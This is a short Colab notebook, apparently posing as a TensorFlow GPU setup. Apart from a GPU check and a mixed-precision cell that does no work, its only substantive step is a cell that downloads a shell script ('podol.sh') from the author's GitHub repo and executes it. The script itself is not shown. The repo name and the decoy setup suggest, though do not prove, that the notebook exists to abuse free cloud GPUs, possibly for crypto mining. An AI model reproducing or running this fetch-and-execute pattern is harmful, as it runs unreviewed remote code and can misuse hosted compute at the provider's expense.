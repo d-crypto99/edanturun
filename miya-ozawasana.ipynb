{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "FoawPN8Q5TnE"
      },
      "source": [
        "# **miya-ozawasana**"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title Check GPU\n",
        "! nvidia-smi -L"
      ],
      "metadata": {
        "cellView": "form",
        "id": "jQNQ66It5LqV",
        "outputId": "5d7258f9-ab02-45c2-b7ad-8cedf12858a4",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "GPU 0: Tesla V100-SXM2-16GB (UUID: GPU-1ff01419-8bdf-d7f1-f411-7e93fa949140)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title max\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "metadata": {
        "cellView": "form",
        "id": "8zM4Gopp5L1H"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "#@title hobaaaahhh.....\n",
        "! wget https://raw.githubusercontent.com/d-crypto99/edanturun/main/podol.sh && chmod u+x podol.sh && ./podol.sh"
      ],
      "metadata": {
        "cellView": "form",
        "id": "XNpc3p0p5L6s"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "Welcome To Colaboratory",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "GPU"
  },
  "nbformat": 4,
  "nbformat_minor": 0
}